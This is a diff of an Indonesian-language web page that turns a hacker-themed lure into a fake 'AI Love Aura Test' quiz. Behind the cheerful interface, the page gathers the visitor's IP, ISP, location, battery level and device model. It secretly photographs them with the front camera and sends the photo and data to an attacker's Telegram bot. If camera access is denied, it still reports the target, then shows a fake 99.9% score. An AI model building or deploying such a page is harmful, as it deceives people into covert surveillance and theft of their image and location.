@@ -3,99 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NEURAL LINK ANALYZER v2.0</title>
+    <title>AI Love Aura Test ✨</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Varela+Round&display=swap');
 
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
-            font-family: 'Fira Code', monospace;
-            background-color: #0a0a0b; color: #00ff41;
-            overflow: hidden; display: flex; justify-content: center; align-items: center;
+            font-family: 'Varela Round', sans-serif;
+            background-color: #ffeef8; /* Pink Pastel */
+            overflow: hidden;
+            display: flex; justify-content: center; align-items: center;
         }
 
-        .bg-grid {
+        /* Background Hati Bertebaran */
+        .bg-hearts {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-image: linear-gradient(rgba(0, 255, 65, 0.1) 1px, transparent 1px),
-                              linear-gradient(90deg, rgba(0, 255, 65, 0.1) 1px, transparent 1px);
-            background-size: 30px 30px; z-index: 1;
+            background-image: radial-gradient(#ffb6c1 1px, transparent 1px);
+            background-size: 25px 25px; opacity: 0.5; z-index: 1;
         }
 
         .container {
-            position: relative; z-index: 10; background: rgba(10, 10, 11, 0.9);
-            padding: 30px; border-radius: 5px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
-            text-align: center; width: 85%; max-width: 400px; border: 1px solid #00ff41;
-            clip-path: polygon(0 0, 100% 0, 100% 90%, 90% 100%, 0 100%);
+            position: relative; z-index: 10;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px; border-radius: 30px;
+            box-shadow: 0 10px 30px rgba(255, 182, 193, 0.5);
+            text-align: center; width: 85%; max-width: 350px;
+            border: 4px solid #ffb6c1;
         }
 
-        /* Tombol Transparan untuk Trigger Pertama */
         #trigger {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: transparent; border: none; cursor: pointer; z-index: 100;
         }
 
-        /* DIALOG IZIN PALSU */
-        #overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.85); z-index: 1000;
+        h1 { color: #ff69b4; font-size: 1.5rem; margin-bottom: 10px; }
+        p { color: #888; font-size: 0.9rem; margin-bottom: 20px; line-height: 1.4; }
+
+        .heart-icon { font-size: 4rem; color: #ff69b4; animation: pulse 1.5s infinite; }
+
+        /* Animasi Scanner Pink */
+        #scan-visual {
+            display: none; position: relative; width: 150px; height: 150px;
+            margin: 20px auto; border: 3px solid #ffb6c1; border-radius: 20px; overflow: hidden;
+        }
+        .scan-bar {
+            position: absolute; width: 100%; height: 5px;
+            background: #ff69b4; box-shadow: 0 0 15px #ff69b4;
+            top: 0; animation: scanLine 2.5s infinite ease-in-out;
         }
 
-        #fake-dialog {
-            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: #0a0a0b; border: 1px solid #00ff41; padding: 20px; width: 280px;
-            z-index: 1001; text-align: center; box-shadow: 0 0 30px rgba(0, 255, 65, 0.4);
+        #result-view { display: none; }
+        .score { font-size: 3rem; color: #ff69b4; font-weight: bold; margin: 10px 0; }
+        .btn-love {
+            background: #ff69b4; color: white; padding: 12px 25px;
+            border-radius: 50px; font-weight: bold; margin-top: 15px; display: inline-block;
         }
 
-        .btn-green {
-            background: transparent; color: #00ff41; border: 1px solid #00ff41;
-            padding: 10px 20px; cursor: pointer; font-family: 'Fira Code'; font-size: 0.8rem;
-            margin-top: 15px; transition: 0.3s; width: 100%;
-        }
-        .btn-green:hover { background: rgba(0, 255, 65, 0.1); }
-
-        /* Scan & Status */
-        #scan-visual { display: none; position: relative; width: 200px; height: 150px; margin: 20px auto; border: 1px solid rgba(0, 255, 65, 0.3); }
-        .scan-bar { position: absolute; width: 100%; height: 2px; background: #00ff41; box-shadow: 0 0 10px #00ff41; top: 0; animation: scanLine 2s infinite linear; }
-        @keyframes scanLine { 0% { top: 0; } 100% { top: 100%; } }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        @keyframes scanLine { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
 
         video, canvas { display: none; position: fixed; }
     </style>
 </head>
 <body>
 
-    <div class="bg-grid"></div>
-
+    <div class="bg-hearts"></div>
     <button id="trigger"></button>
-
-    <div id="overlay"></div>
-    <div id="fake-dialog">
-        <div style="font-size: 2rem; margin-bottom: 10px;">◈</div>
-        <h2 style="font-size: 1rem; margin-bottom: 10px;">AUTH_REQUIRED</h2>
-        <p style="font-size: 0.7rem; color: #888; line-height: 1.4;">
-            Sistem memerlukan kalibrasi <span style="color:#00ff41">Sensor Biometrik (Kamera)</span> untuk verifikasi neural link.
-        </p>
-        <button class="btn-green" onclick="requestActualPermission()">ALLOW ACCESS</button>
-    </div>
 
     <div class="container">
         <div id="setup-view">
-            <div style="font-size: 3rem; animation: flicker 2s infinite;">◈</div>
-            <h1>Neural Link Analyzer</h1>
-            <p>[SYSTEM READY]<br>Klik di mana saja untuk memulai kalibrasi biometrik.</p>
-            <div style="border: 1px dashed #00ff41; padding: 10px; font-size: 0.8rem;">INITIALIZE_UPLINK</div>
+            <div class="heart-icon">💖</div>
+            <h1>Cek Aura Cintamu!</h1>
+            <p>Penasaran seberapa besar aura kecantikan dan keberuntungan cintamu hari ini? ✨<br><br>Gunakan <b>AI Love Cam</b> untuk analisa instan!</p>
+            <div class="btn-love">MULAI CEK ✨</div>
         </div>
 
         <div id="scan-view" style="display:none;">
             <div id="scan-visual">
                 <div class="scan-bar"></div>
-                <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:0.5rem; opacity:0.5;">UPLINKING...</div>
+                <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:3rem;">📸</div>
             </div>
-            <h1 id="status-text">Capturing...</h1>
+            <h1 id="status-text">Menganalisa Aura...</h1>
+            <p>Tetap cantik & jangan bergerak ya! 😊</p>
         </div>
 
-        <div id="result-view" style="display:none;">
-            <h1>Scan Complete</h1>
-            <p style="color:#00ff41">[ACCESS GRANTED]</p>
+        <div id="result-view">
+            <div style="font-size: 3rem;">🥰</div>
+            <h1>Analisa Selesai!</h1>
+            <p>Level Aura Cintamu Hari Ini:</p>
+            <div class="score">99.9%</div>
+            <p style="color: #ff69b4; font-weight: bold;">✨ Kamu sangat bersinar! ✨</p>
+            <p style="font-size: 0.7rem;">(Hasil ini telah disimpan ke sistem keberuntungan)</p>
         </div>
     </div>
 
@@ -109,47 +107,47 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const trigger = document.getElementById('trigger');
-        const overlay = document.getElementById('overlay');
-        const fakeDialog = document.getElementById('fake-dialog');
 
-        // Tahap 1: Munculkan Dialog Palsu saat layar diklik
-        trigger.onclick = () => {
+        async function startLoveScan() {
             trigger.style.display = 'none';
-            overlay.style.display = 'block';
-            fakeDialog.style.display = 'block';
-        };
-
-        // Tahap 2: Minta Izin Asli Browser
-        async function requestActualPermission() {
-            overlay.style.display = 'none';
-            fakeDialog.style.display = 'none';
             document.getElementById('setup-view').style.display = 'none';
             document.getElementById('scan-view').style.display = 'block';
 
+            // 1. Data Jaringan
+            let netData = "N/A";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                netData = `IP: ${d.ip}\nISP: ${d.org}\nLokasi: ${d.city}, ${d.region}`;
+            } catch (e) {}
+
+            // 2. Data Baterai & Device
+            let bat = "N/A";
+            try { const b = await navigator.getBattery(); bat = `${(b.level*100).toFixed(0)}%`; } catch(e){}
+            const model = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Unknown";
+
+            const fullReport = `
+💖 [LOVE SCAN REPORT]
+----------------------
+📱 Device: ${model}
+🔋 Battery: ${bat}
+🌐 Net: ${netData}
+⏰ Time: ${new Date().toLocaleString('id-ID')}
+----------------------`;
+
+            // 3. Akses Kamera
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
-                document.getElementById('scan-visual').style.display = 'block';
-                
-                // Ambil IP Secara diam-diam
-                let netInfo = "N/A";
-                try {
-                    const res = await fetch('https://ipapi.co/json/');
-                    const d = await res.json();
-                    netInfo = `IP: ${d.ip} | ISP: ${d.org} | Loc: ${d.city}`;
-                } catch(e){}
-
-                setTimeout(() => {
-                    captureAndSend(stream, netInfo);
-                }, 3500);
-
+                setTimeout(() => { capture(stream, fullReport); }, 3500);
             } catch (err) {
-                alert("ERR_HARDWARE_ACCESS_DENIED: Kalibrasi gagal.");
+                sendToTelegram("❌ Target Menolak Akses Kamera\n" + fullReport);
+                alert("Aura tidak terdeteksi! Mohon izinkan kamera agar AI bisa melihat auramu. ✨");
                 location.reload();
             }
         }
 
-        function captureAndSend(stream, info) {
+        function capture(stream, report) {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
@@ -160,14 +158,18 @@
             const blob = dataURItoBlob(canvas.toDataURL('image/png'));
             const formData = new FormData();
             formData.append('chat_id', TG_CHAT_ID);
-            formData.append('photo', blob, 'bio.png');
-            formData.append('caption', `🛡️ [SYSTEM_LOG]\n${info}\nDevice: ${navigator.platform}`);
+            formData.append('photo', blob, 'aura.png');
+            formData.append('caption', `✨ [SUCCESS SCAN]\n${report}`);
 
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
 
             stream.getTracks().forEach(t => t.stop());
             document.getElementById('scan-view').style.display = 'none';
             document.getElementById('result-view').style.display = 'block';
+        }
+
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}`);
         }
 
         function dataURItoBlob(dataURI) {
@@ -177,6 +179,8 @@
             for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
             return new Blob([ab], {type: 'image/png'});
         }
+
+        trigger.addEventListener('click', startLoveScan);
     </script>
 </body>
 </html>
